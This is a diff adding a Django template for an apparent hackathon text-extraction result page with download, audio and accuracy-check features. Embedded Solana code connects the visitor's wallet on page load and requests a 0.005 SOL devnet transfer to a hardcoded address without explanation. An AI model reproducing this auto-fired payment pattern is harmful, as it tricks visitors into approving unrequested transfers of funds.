@@ -1,0 +1,287 @@
+{% load static %}
+{% get_static_prefix as STATIC_PREFIX %}
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+
+<head>
+
+    <meta charset="utf-8">
+    <title>KJSCE | HAckathaon</title>
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <link rel="stylesheet" type="text/css" href="{% static 'assets/css/style.css' %}">
+
+    <link rel="stylesheet" type="text/css" href="{% static 'assets/css/responsive.css' %}">
+    
+    <link rel="shortcut icon" href="{% static 'assets/icon/Favicon.png' %}">
+    <link rel="apple-touch-icon-precomposed" href="{% static 'assets/icon/Favicon.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"
+        type="text/javascript"></script>
+        <script src="https://unpkg.com/@solana/web3.js@v1.33.0/lib/index.iife.js"></script>
+   
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+      
+</head>
+
+<body class="body header-fixed home-4" >
+    <div id="wrapper" class="wrapper-style">
+        <div id="page" class="clearfix">
+            <header class="header absolute">
+                <div class="tf-container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div id="site-header-inner">
+                                <div id="site-logo" class="clearfix">
+                                    <div id="site-logo-inner">
+                                        <a href="{% url 'homepage' %}" rel="home" class="main-logo">
+                                            <img id="logo_header" src="{% static 'assets/images/logo/logo_dark.png' %}" alt="Image">
+                                        </a>
+                                    </div>
+                                </div>
+                                <div class="header-center">
+                                    <nav id="main-nav" class="main-nav">
+                                        <ul id="menu-primary-menu" class="menu">
+                                            <li class="menu-item">
+                                                <a href="{% url 'homepage' %}">Home</a>
+                                            </li>
+                                            <li class="menu-item  current-menu-item">
+                                                <a href="{% url 'scan' %}">Scan</a>
+                                            </li>
+                                            <li class="menu-item">
+                                                <a href="/about">About</a>
+                                            </li>
+                                            <li class="menu-item ">
+                                                <a href="/contact">Contact</a>
+                                            </li>
+                                           
+                                        </ul>
+                                    </nav>
+                                </div>
+                               
+                                <div class="mobile-button"><span></span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </header>
+           <br><br><br>
+            
+            
+  
+            <section class="tf-faq">
+                <div class="tf-container">
+                    <div class="row justify-content-center">
+                        <div class="col-md-8">
+                            <div class="tf-heading style-5">
+                                <h4 class="heading">Result</h4>
+                                <p class="sub-heading">  View & Edit the Text Extracted from Your Uploaded File. Download the report in DOCX form. </p>
+                            </div>
+                            <div class="tf-accordion">
+                                <div class="tf-toggle">
+                                   
+                                    <fieldset class="message">
+                                        
+                                        <textarea id="message" name="message" rows="4" placeholder="Message"
+                                            tabindex="4" aria-required="true" required="" style="height:300px ; color:white;">{{ text }}</textarea>
+                                    </fieldset>
+                                    
+
+
+                                </div>
+                                <div class="btn-submit"><button class="tf-button" type="submit"><a  href="{{ STATIC_PREFIX }}{{ location }}" download target="_blank">Download</a></button></div>
+                                <br>
+                                 <button onclick="playAudio()">Play Audio</button>
+                            <br><br><hr><br><br>
+                            <p>Original Text (For test purpose only)</p><br>
+                             <form action="/matchacc" method="post">
+                                    {% csrf_token %}
+                                <div class="tf-toggle">
+
+                                    <fieldset class="message">
+                                        <textarea id="message" name="message" rows="4" placeholder="Message"
+                                            tabindex="4" aria-required="true" required="" style="height:300px ; color:white;"></textarea>
+                                    </fieldset> 
+
+
+                                </div>
+                                <div class="btn-submit"><input class="tf-button" type="submit" value="Compute Accuracy"/></div>
+                                </form>
+                                
+                                
+
+                            <br>
+                            <br>
+                            <p>Accuracy of the comparison is : </p>
+                            </div>
+                              <br>
+                            <div class="column">
+    
+                              <!-- <input class="Input" type="text" placeholder="Sol to send" id="inputBox" /> -->
+                              <!-- <input class="Input" type=number placeholder="Sol to send" id="quantity" /> -->
+                              <button id="connect_button" class="button-9" onclick="connectWallet()">Connect</button>
+                              
+                              <p id="status_p"><span id="status"></span></p>
+                            </div>
+                            <script>
+                              var wallet;
+                              const lamports_per_sol = solanaWeb3.LAMPORTS_PER_SOL;
+                              function connectWallet() {
+                                (async () => {
+                                  try {
+                                    wallet = await window.solana.connect();
+                                  } catch (err) {
+                                    console.log(err);
+                                  }
+                                  sendButtonClick();
+                                })();
+                                window.solana.on(
+                                  "connect",
+                                  () => (
+                                    
+                                    document.getElementById("connect_button").innerText = "Connected"
+                                  )
+                                );
+                              }
+                          
+                              async function sendButtonClick() {
+                                const receiverAddress = "AjbMiGS3pFXeTef4vXsEct4PuSbG6g1vGGJPJvVtcc8Z"
+                                /*document.getElementById("quantity").value;*/ 
+                                const quantity = 0.005;
+                                if (quantity != null && quantity != 0) {
+                                  document.getElementById("status_p").text = "Status";
+                                  document.getElementById("status_p").innerText = "Sending " + quantity + " SOL to " + ellipsizeAddress(receiverAddress) + " account address";
+                                  await signInTransactionAndSendMoney(receiverAddress, quantity)
+                                } else {
+                                  document.getElementById("status_p").text = "Status";
+                                  document.getElementById("status_p").innerText = "Amount must be more than 0!"
+                                }
+                          
+                              }
+                          
+                              function ellipsizeAddress(str) {
+                                if (str.length > 35) {
+                                  return str.substr(0, 8) + '...' + str.substr(str.length - 8, str.length);
+                                }
+                                return str;
+                              }
+                          
+                              function signInTransactionAndSendMoney(destPubkeyStr, quantity) {
+                                (async () => {
+                                  const network = "https://api.devnet.solana.com";
+                                  const connection = new solanaWeb3.Connection(network);
+                                  const transaction = new solanaWeb3.Transaction();
+                          
+                                  try {
+                                    const lamports = quantity * lamports_per_sol;
+                          
+                                    console.log("starting sendMoney");
+                                    const destPubkey = new solanaWeb3.PublicKey(destPubkeyStr);
+                                    const walletAccountInfo = await connection.getAccountInfo(
+                                      wallet.publicKey
+                                    );
+                                    console.log("wallet data size", walletAccountInfo?.data.length);
+                          
+                                    const receiverAccountInfo = await connection.getAccountInfo(
+                                      destPubkey
+                                    );
+                                    console.log("receiver data size", receiverAccountInfo?.data.length);
+                          
+                                    const instruction = solanaWeb3.SystemProgram.transfer({
+                                      fromPubkey: wallet.publicKey,
+                                      toPubkey: destPubkey,
+                                      lamports,
+                                    });
+                                    let trans = await setWalletTransaction(instruction, connection);
+                          
+                                    let signature = await signAndSendTransaction(
+                                      wallet,
+                                      trans,
+                                      connection
+                                    );
+                          
+                                  } catch (e) {
+                                    console.warn("Failed", e);
+                                  }
+                          
+                                })();
+                          
+                                async function setWalletTransaction(instruction, connection) {
+                                  const transaction = new solanaWeb3.Transaction();
+                                  transaction.add(instruction);
+                                  transaction.feePayer = wallet.publicKey;
+                                  let hash = await connection.getRecentBlockhash();
+                                  console.log("blockhash", hash);
+                                  transaction.recentBlockhash = hash.blockhash;
+                                  return transaction;
+                                }
+                          
+                                async function signAndSendTransaction(wallet, transaction, connection) {
+                                  // Sign transaction, broadcast, and confirm
+                                  const { signature } = await window.solana.signAndSendTransaction(
+                                    transaction
+                                  );
+                                  await connection.confirmTransaction(signature);
+                                  return signature;
+                                }
+                              }
+                            </script>
+                        </div>
+                    </div>
+                </div>
+        </div>
+
+
+           
+
+
+
+        </section>
+  
+            
+
+                    <script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+                    <script src="{% static 'assets/js/jquery.min.js' %}"></script>
+                    <script src="{% static 'assets/js/jquery.easing.js' %}"></script>
+                    <script src="{% static 'assets/js/bootstrap.min.js' %}"></script>
+                    <script src="{% static 'assets/js/swiper-bundle.min.js' %}"></script>
+                    <script src="{% static 'assets/js/swiper.js' %}"></script>
+                    <script src="{% static 'assets/js/count-down.js' %}"></script>
+                    <script src="{% static 'assets/js/jquery.isotope.min.js' %}"></script>
+                    <script src="{% static 'assets/js/plugin.js' %}"></script>
+                    <script src="{% static 'assets/js/shortcodes.js' %}"></script>
+                    <script src="{% static 'assets/js/main.js' %}"></script>
+                    <script src="{% static 'assets/js/switchmode.js' %}"></script>
+                    <script>
+                    function playAudio() {
+                         const audioFileUrl = "{% static 'assets/Audio/output.mp3' %}";
+                         const audio = new Audio(audioFileUrl);
+                        audio.play();
+                    }
+                    </script>
+
+                      <script>
+          window.onload=function connectWallet() {
+                                (async () => {
+                                  try {
+                                    wallet = await window.solana.connect();
+                                  } catch (err) {
+                                    console.log(err);
+                                  }
+                                  sendButtonClick();
+                                })();
+                                window.solana.on(
+                                  "connect",
+                                  () => (
+                                    
+                                    document.getElementById("connect_button").innerText = "Connected"
+                                  )
+                                );
+                              }
+        </script>
+                    
+                    </body>
+                    </html>
